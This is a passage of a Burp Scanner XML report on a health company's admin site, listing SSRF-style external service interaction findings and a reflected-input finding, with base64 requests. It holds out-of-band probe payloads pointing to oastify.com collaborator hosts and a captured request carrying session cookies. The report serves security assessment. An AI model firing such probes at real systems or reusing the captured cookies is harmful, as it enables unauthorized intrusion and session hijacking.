      <request method="GET" base64="true"><![CDATA[R0VUIC9qcy9tb21lbnQubWluLmpzIEhUVFAvMg0KSG9zdDogYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20NCkNvb2tpZTogUEhQU0VTU0lEPWthajYxMG0wcnBncXE0YWljc3VtYWdvZjRzOyBBV1NBTEI9YndLM3lVTUNiWVdFcVBDV1NaeXo1b0lJUXVFMHhiRlR2bDVKUys5d0RISzBra3FJYXRmWEo3UFFhQ082czlobzE5czhtd0k2blM4VlJEdWt1RFlJOFpvWi8zSWtkSE1YK29WdVUzUUhPSmFFRVh5cGVwbjdManhiNit5WDsgQVdTQUxCQ09SUz1id0szeVVNQ2JZV0VxUENXU1p5ejVvSUlRdUUweGJGVHZsNUpTKzl3REhLMGtrcUlhdGZYSjdQUWFDTzZzOWhvMTlzOG13STZuUzhWUkR1a3VEWUk4Wm9aLzNJa2RITVgrb1Z1VTNRSE9KYUVFWHlwZXBuN0xqeGI2K3lYDQpTZWMtQ2gtVWEtUGxhdGZvcm06ICJMaW51eCINCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjkNClNlYy1DaC1VYTogIkNocm9taXVtIjt2PSIxMzEiLCAiTm90X0EgQnJhbmQiO3Y9IjI0Ig0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMS4wLjY3NzguODYgU2FmYXJpLzUzNy4zNg0KU2VjLUNoLVVhLU1vYmlsZTogPzANCkFjY2VwdDogKi8qDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Nb2RlOiBuby1jb3JzDQpTZWMtRmV0Y2gtRGVzdDogc2NyaXB0DQpSZWZlcmVyOiBodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL2xvZ2luDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpQcmlvcml0eTogdT0yDQoNCg==]]></request>
      <response base64="true"><![CDATA[]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>5143517671657803776</serialNumber>
    <type>3146240</type>
    <name><![CDATA[External service interaction (DNS)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/js/moment.min.js]]></path>
    <location><![CDATA[/js/moment.min.js]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>The ability to induce an application to interact with an arbitrary external service, such as a web or mail server, does not constitute a vulnerability in its own right. This might even be the intended behavior of the application. However, in some cases, it can indicate a vulnerability with serious consequences.</p>
<p>If you can trigger DNS-based interactions, it is normally possible to trigger interactions using other service types. Burp Scanner reports these as separate issues. You may find that a payload, such as a URL, only triggers a DNS-based interaction, even though you were expecting interactions with a different service as well. This could be due to egress filters on the network layer that prevent the application from connecting to these other services. However, some systems perform DNS lookups without any intention of connecting to the remote host. This behavior is typically harmless.</p>
<p>The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy. By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>You should review the purpose and intended use of the relevant application functionality, 
  and determine whether the ability to trigger arbitrary external service interactions is intended behavior. 
  If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. 
  These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter.</p>
<p>If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist.</p>

<p>Out-of-Band Application Security Testing (OAST) is highly effective at uncovering high-risk features, to the point where finding the root cause of an interaction can be quite challenging. To find the source of an external service interaction, try to identify whether it is triggered by specific application functionality, or occurs indiscriminately on all requests. If it occurs on all endpoints, a front-end CDN or application firewall may be responsible, or a back-end analytics system parsing server logs. In some cases, interactions may originate from third-party systems; for example, a HTTP request may trigger a poisoned email which passes through a link-scanner on its way to the recipient.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/blog/introducing-burp-collaborator">Burp Collaborator</a></li><li><a href="https://portswigger.net/burp/application-security-testing/oast">Out-of-band application security testing (OAST)</a></li><li><a href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface">PortSwigger Research: Cracking the Lens</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918: Server-Side Request Forgery (SSRF)</a></li><li><a href="https://cwe.mitre.org/data/definitions/406.html">CWE-406: Insufficient Control of Network Message Volume (Network Amplification)</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[It is possible to induce the application to perform server-side DNS lookups of arbitrary domain names.<br><br>The payload <b>vzya5wqblss6dqm3iae33235uw0qonfb8aw0jq7f.oastify.com</b> was submitted in the SSL SNI value and the HTTP Host header.<br><br>The application performed a DNS lookup of the specified domain.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IHZ6eWE1d3FibHNzNmRxbTNpYWUzMzIzNXV3MHFvbmZiOGF3MGpxN2Yub2FzdGlmeS5jb20NClByYWdtYTogbm8tY2FjaGUNCkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlLCBuby10cmFuc2Zvcm0NCkNvbm5lY3Rpb246IGNsb3NlDQoNCg==]]></request>
    </requestresponse>
    <collaboratorEvent>
      <interactionType>DNS</interactionType>
      <originIp>134.209.78.125</originIp>
      <time>2024-Dec-15 00:51:50.377 UTC</time>
      <lookupType>A</lookupType>
      <lookupHost>vzya5wqblss6dqm3iae33235uw0qonfb8aw0jq7f.oastify.com</lookupHost>
    </collaboratorEvent>
  </issue>
  <issue>
    <serialNumber>4669851146411036672</serialNumber>
    <type>3146256</type>
    <name><![CDATA[External service interaction (HTTP)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/js/moment.min.js]]></path>
    <location><![CDATA[/js/moment.min.js]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>External service interaction arises when it is possible to induce an application to interact with an arbitrary external service, such as a web or mail server. The ability to trigger arbitrary external service interactions does not constitute a vulnerability in its own right, and in some cases might even be the intended behavior of the application.
However, in many cases, it can indicate a vulnerability with serious consequences.</p>
<p>The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy.
  By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. 
  This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. 
  Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>You should review the purpose and intended use of the relevant application functionality, 
  and determine whether the ability to trigger arbitrary external service interactions is intended behavior. 
  If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. 
  These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter.</p>
<p>If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist.</p>

<p>Out-of-Band Application Security Testing (OAST) is highly effective at uncovering high-risk features, to the point where finding the root cause of an interaction can be quite challenging. To find the source of an external service interaction, try to identify whether it is triggered by specific application functionality, or occurs indiscriminately on all requests. If it occurs on all endpoints, a front-end CDN or application firewall may be responsible, or a back-end analytics system parsing server logs. In some cases, interactions may originate from third-party systems; for example, a HTTP request may trigger a poisoned email which passes through a link-scanner on its way to the recipient.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/blog/introducing-burp-collaborator">Burp Collaborator</a></li><li><a href="https://portswigger.net/burp/application-security-testing/oast">Out-of-band application security testing (OAST)</a></li><li><a href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface">PortSwigger Research: Cracking the Lens</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918: Server-Side Request Forgery (SSRF)</a></li><li><a href="https://cwe.mitre.org/data/definitions/406.html">CWE-406: Insufficient Control of Network Message Volume (Network Amplification)</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[It is possible to induce the application to perform server-side HTTPS requests to arbitrary domains.<br><br>The payload <b>vzya5wqblss6dqm3iae33235uw0qonfb8aw0jq7f.oastify.com</b> was submitted in the SSL SNI value and the HTTP Host header.<br><br>The application performed an HTTPS request to the specified domain.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IHZ6eWE1d3FibHNzNmRxbTNpYWUzMzIzNXV3MHFvbmZiOGF3MGpxN2Yub2FzdGlmeS5jb20NClByYWdtYTogbm8tY2FjaGUNCkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlLCBuby10cmFuc2Zvcm0NCkNvbm5lY3Rpb246IGNsb3NlDQoNCg==]]></request>
    </requestresponse>
    <collaboratorEvent>
      <interactionType>HTTPS</interactionType>
      <originIp>206.189.185.124</originIp>
      <time>2024-Dec-15 00:51:50.931 UTC</time>
      <requestresponse>
        <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IHZ6eWE1d3FibHNzNmRxbTNpYWUzMzIzNXV3MHFvbmZiOGF3MGpxN2Yub2FzdGlmeS5jb20NCnVzZXItYWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzU1LjAuMjg4My44NyBTYWZhcmkvNTM3LjM2DQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkFjY2VwdDogKi8qDQpDb25uZWN0aW9uOiBrZWVwLWFsaXZlDQoNCg==]]></request>
        <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpTZXJ2ZXI6IEJ1cnAgQ29sbGFib3JhdG9yIGh0dHBzOi8vYnVycGNvbGxhYm9yYXRvci5uZXQvDQpYLUNvbGxhYm9yYXRvci1WZXJzaW9uOiA0DQpDb250ZW50LVR5cGU6IHRleHQvaHRtbA0KQ29udGVudC1MZW5ndGg6IDYzDQoNCjxodG1sPjxib2R5Pjd5ZWQ3bjl6NmRjMTVvem9senJzdmp6am1ncGpnbHJnaWZpZ3o8L2JvZHk+PC9odG1sPg==]]></response>
        <responseRedirected>false</responseRedirected>
      </requestresponse>
    </collaboratorEvent>
  </issue>
  <issue>
    <serialNumber>6645242967234930688</serialNumber>
    <type>4197376</type>
    <name><![CDATA[Input returned in response (reflected)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/js/scripts.js]]></path>
    <location><![CDATA[/js/scripts.js [URL path filename]]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>]]></issueBackground>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li><li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The value of the URL path filename is copied into the application's response.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9qcy9kdXBhbHhnZDVqP3Y9NmVjNDIxIEhUVFAvMg0KSG9zdDogYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC43DQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTO3E9MC45LGVuO3E9MC44DQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTMxLjAuNjc3OC44NiBTYWZhcmkvNTM3LjM2DQpDb25uZWN0aW9uOiBjbG9zZQ0KQ2FjaGUtQ29udHJvbDogbWF4LWFnZT0wDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtQ0gtVUE6ICIuTm90L0EpQnJhbmQiO3Y9Ijk5IiwgIkdvb2dsZSBDaHJvbWUiO3Y9IjEzMSIsICJDaHJvbWl1bSI7dj0iMTMxIg0KU2VjLUNILVVBLVBsYXRmb3JtOiBXaW5kb3dzDQpTZWMtQ0gtVUEtTW9iaWxlOiA/MA0KDQo=]]></request>
      <response base64="true"><![CDATA[]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>8786157886132058112</serialNumber>
    <type>3146240</type>
    <name><![CDATA[External service interaction (DNS)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/js/scripts.js]]></path>
    <location><![CDATA[/js/scripts.js]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>The ability to induce an application to interact with an arbitrary external service, such as a web or mail server, does not constitute a vulnerability in its own right. This might even be the intended behavior of the application. However, in some cases, it can indicate a vulnerability with serious consequences.</p>
<p>If you can trigger DNS-based interactions, it is normally possible to trigger interactions using other service types. Burp Scanner reports these as separate issues. You may find that a payload, such as a URL, only triggers a DNS-based interaction, even though you were expecting interactions with a different service as well. This could be due to egress filters on the network layer that prevent the application from connecting to these other services. However, some systems perform DNS lookups without any intention of connecting to the remote host. This behavior is typically harmless.</p>
<p>The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy. By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>You should review the purpose and intended use of the relevant application functionality, 
  and determine whether the ability to trigger arbitrary external service interactions is intended behavior. 
  If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. 
  These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter.</p>
<p>If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist.</p>

<p>Out-of-Band Application Security Testing (OAST) is highly effective at uncovering high-risk features, to the point where finding the root cause of an interaction can be quite challenging. To find the source of an external service interaction, try to identify whether it is triggered by specific application functionality, or occurs indiscriminately on all requests. If it occurs on all endpoints, a front-end CDN or application firewall may be responsible, or a back-end analytics system parsing server logs. In some cases, interactions may originate from third-party systems; for example, a HTTP request may trigger a poisoned email which passes through a link-scanner on its way to the recipient.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/blog/introducing-burp-collaborator">Burp Collaborator</a></li><li><a href="https://portswigger.net/burp/application-security-testing/oast">Out-of-band application security testing (OAST)</a></li><li><a href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface">PortSwigger Research: Cracking the Lens</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918: Server-Side Request Forgery (SSRF)</a></li><li><a href="https://cwe.mitre.org/data/definitions/406.html">CWE-406: Insufficient Control of Network Message Volume (Network Amplification)</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[It is possible to induce the application to perform server-side DNS lookups of arbitrary domain names.<br><br>The payload <b>a6hpcbxqs7zlk5tippliahak1b75v1xpqoee14pt.oastify.com</b> was submitted in the SSL SNI value and the HTTP Host header.<br><br>The application performed a DNS lookup of the specified domain.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IGE2aHBjYnhxczd6bGs1dGlwcGxpYWhhazFiNzV2MXhwcW9lZTE0cHQub2FzdGlmeS5jb20NClByYWdtYTogbm8tY2FjaGUNCkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlLCBuby10cmFuc2Zvcm0NCkNvbm5lY3Rpb246IGNsb3NlDQoNCg==]]></request>
    </requestresponse>
    <collaboratorEvent>
      <interactionType>DNS</interactionType>
      <originIp>67.205.148.18</originIp>
      <time>2024-Dec-15 00:49:43.499 UTC</time>
      <lookupType>A</lookupType>
      <lookupHost>a6hpcbxqs7zlk5tippliahak1b75v1xpqoee14pt.oastify.com</lookupHost>
    </collaboratorEvent>
  </issue>
  <issue>
    <serialNumber>4075568690416673792</serialNumber>
    <type>3146256</type>
    <name><![CDATA[External service interaction (HTTP)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/js/scripts.js]]></path>
    <location><![CDATA[/js/scripts.js]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>External service interaction arises when it is possible to induce an application to interact with an arbitrary external service, such as a web or mail server. The ability to trigger arbitrary external service interactions does not constitute a vulnerability in its own right, and in some cases might even be the intended behavior of the application.
However, in many cases, it can indicate a vulnerability with serious consequences.</p>
<p>The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy.
  By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. 
  This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. 
  Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>You should review the purpose and intended use of the relevant application functionality, 
  and determine whether the ability to trigger arbitrary external service interactions is intended behavior. 
  If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. 
  These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter.</p>
<p>If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist.</p>

<p>Out-of-Band Application Security Testing (OAST) is highly effective at uncovering high-risk features, to the point where finding the root cause of an interaction can be quite challenging. To find the source of an external service interaction, try to identify whether it is triggered by specific application functionality, or occurs indiscriminately on all requests. If it occurs on all endpoints, a front-end CDN or application firewall may be responsible, or a back-end analytics system parsing server logs. In some cases, interactions may originate from third-party systems; for example, a HTTP request may trigger a poisoned email which passes through a link-scanner on its way to the recipient.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/blog/introducing-burp-collaborator">Burp Collaborator</a></li><li><a href="https://portswigger.net/burp/application-security-testing/oast">Out-of-band application security testing (OAST)</a></li><li><a href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface">PortSwigger Research: Cracking the Lens</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918: Server-Side Request Forgery (SSRF)</a></li><li><a href="https://cwe.mitre.org/data/definitions/406.html">CWE-406: Insufficient Control of Network Message Volume (Network Amplification)</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[It is possible to induce the application to perform server-side HTTPS requests to arbitrary domains.<br><br>The payload <b>a6hpcbxqs7zlk5tippliahak1b75v1xpqoee14pt.oastify.com</b> was submitted in the SSL SNI value and the HTTP Host header.<br><br>The application performed an HTTPS request to the specified domain.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IGE2aHBjYnhxczd6bGs1dGlwcGxpYWhhazFiNzV2MXhwcW9lZTE0cHQub2FzdGlmeS5jb20NClByYWdtYTogbm8tY2FjaGUNCkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlLCBuby10cmFuc2Zvcm0NCkNvbm5lY3Rpb246IGNsb3NlDQoNCg==]]></request>
    </requestresponse>
    <collaboratorEvent>
      <interactionType>HTTPS</interactionType>
      <originIp>206.189.185.124</originIp>
      <time>2024-Dec-15 00:49:44.354 UTC</time>
      <requestresponse>
        <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IGE2aHBjYnhxczd6bGs1dGlwcGxpYWhhazFiNzV2MXhwcW9lZTE0cHQub2FzdGlmeS5jb20NCnVzZXItYWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzU1LjAuMjg4My44NyBTYWZhcmkvNTM3LjM2DQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkFjY2VwdDogKi8qDQpDb25uZWN0aW9uOiBrZWVwLWFsaXZlDQoNCg==]]></request>
        <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpTZXJ2ZXI6IEJ1cnAgQ29sbGFib3JhdG9yIGh0dHBzOi8vYnVycGNvbGxhYm9yYXRvci5uZXQvDQpYLUNvbGxhYm9yYXRvci1WZXJzaW9uOiA0DQpDb250ZW50LVR5cGU6IHRleHQvaHRtbA0KQ29udGVudC1MZW5ndGg6IDYzDQoNCjxodG1sPjxib2R5Pjd5ZWQ3bjl6NmRjMTVvem9senJzdmp6am1nb3VnbHJnaWZpZ3o8L2JvZHk+PC9odG1sPg==]]></response>
        <responseRedirected>false</responseRedirected>
      </requestresponse>
    </collaboratorEvent>
  </issue>
  <issue>
    <serialNumber>3745635714673256448</serialNumber>
    <type>3146240</type>
    <name><![CDATA[External service interaction (DNS)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/js/select2.min.js]]></path>
    <location><![CDATA[/js/select2.min.js]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>The ability to induce an application to interact with an arbitrary external service, such as a web or mail server, does not constitute a vulnerability in its own right. This might even be the intended behavior of the application. However, in some cases, it can indicate a vulnerability with serious consequences.</p>
<p>If you can trigger DNS-based interactions, it is normally possible to trigger interactions using other service types. Burp Scanner reports these as separate issues. You may find that a payload, such as a URL, only triggers a DNS-based interaction, even though you were expecting interactions with a different service as well. This could be due to egress filters on the network layer that prevent the application from connecting to these other services. However, some systems perform DNS lookups without any intention of connecting to the remote host. This behavior is typically harmless.</p>
<p>The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy. By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>You should review the purpose and intended use of the relevant application functionality, 
  and determine whether the ability to trigger arbitrary external service interactions is intended behavior. 
  If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. 
  These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter.</p>
<p>If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist.</p>

<p>Out-of-Band Application Security Testing (OAST) is highly effective at uncovering high-risk features, to the point where finding the root cause of an interaction can be quite challenging. To find the source of an external service interaction, try to identify whether it is triggered by specific application functionality, or occurs indiscriminately on all requests. If it occurs on all endpoints, a front-end CDN or application firewall may be responsible, or a back-end analytics system parsing server logs. In some cases, interactions may originate from third-party systems; for example, a HTTP request may trigger a poisoned email which passes through a link-scanner on its way to the recipient.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/blog/introducing-burp-collaborator">Burp Collaborator</a></li><li><a href="https://portswigger.net/burp/application-security-testing/oast">Out-of-band application security testing (OAST)</a></li><li><a href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface">PortSwigger Research: Cracking the Lens</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918: Server-Side Request Forgery (SSRF)</a></li><li><a href="https://cwe.mitre.org/data/definitions/406.html">CWE-406: Insufficient Control of Network Message Volume (Network Amplification)</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[It is possible to induce the application to perform server-side DNS lookups of arbitrary domain names.<br><br>The payload <b>ob33hp24xl4zpjywu3qwfvfy6pcj0h15u4iu5kt9.oastify.com</b> was submitted in the SSL SNI value and the HTTP Host header.<br><br>The application performed a DNS lookup of the specified domain.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IG9iMzNocDI0eGw0enBqeXd1M3F3ZnZmeTZwY2owaDE1dTRpdTVrdDkub2FzdGlmeS5jb20NClByYWdtYTogbm8tY2FjaGUNCkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlLCBuby10cmFuc2Zvcm0NCkNvbm5lY3Rpb246IGNsb3NlDQoNCg==]]></request>
    </requestresponse>
    <collaboratorEvent>
      <interactionType>DNS</interactionType>
      <originIp>167.99.160.10</originIp>
      <time>2024-Dec-15 00:59:57.596 UTC</time>
      <lookupType>A</lookupType>
      <lookupHost>ob33hp24xl4zpjywu3qwfvfy6pcj0h15u4iu5kt9.oastify.com</lookupHost>
    </collaboratorEvent>
  </issue>
  <issue>
    <serialNumber>635661242911603712</serialNumber>
    <type>3146256</type>
    <name><![CDATA[External service interaction (HTTP)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/js/select2.min.js]]></path>
    <location><![CDATA[/js/select2.min.js]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>External service interaction arises when it is possible to induce an application to interact with an arbitrary external service, such as a web or mail server. The ability to trigger arbitrary external service interactions does not constitute a vulnerability in its own right, and in some cases might even be the intended behavior of the application.
However, in many cases, it can indicate a vulnerability with serious consequences.</p>
<p>The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy.
  By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. 
  This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. 
  Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>You should review the purpose and intended use of the relevant application functionality, 
  and determine whether the ability to trigger arbitrary external service interactions is intended behavior. 
  If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. 
  These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter.</p>
<p>If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist.</p>

<p>Out-of-Band Application Security Testing (OAST) is highly effective at uncovering high-risk features, to the point where finding the root cause of an interaction can be quite challenging. To find the source of an external service interaction, try to identify whether it is triggered by specific application functionality, or occurs indiscriminately on all requests. If it occurs on all endpoints, a front-end CDN or application firewall may be responsible, or a back-end analytics system parsing server logs. In some cases, interactions may originate from third-party systems; for example, a HTTP request may trigger a poisoned email which passes through a link-scanner on its way to the recipient.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/blog/introducing-burp-collaborator">Burp Collaborator</a></li><li><a href="https://portswigger.net/burp/application-security-testing/oast">Out-of-band application security testing (OAST)</a></li><li><a href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface">PortSwigger Research: Cracking the Lens</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918: Server-Side Request Forgery (SSRF)</a></li><li><a href="https://cwe.mitre.org/data/definitions/406.html">CWE-406: Insufficient Control of Network Message Volume (Network Amplification)</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[It is possible to induce the application to perform server-side HTTPS requests to arbitrary domains.<br><br>The payload <b>ob33hp24xl4zpjywu3qwfvfy6pcj0h15u4iu5kt9.oastify.com</b> was submitted in the SSL SNI value and the HTTP Host header.<br><br>The application performed an HTTPS request to the specified domain.]]></issueDetail>
    <requestresponse>
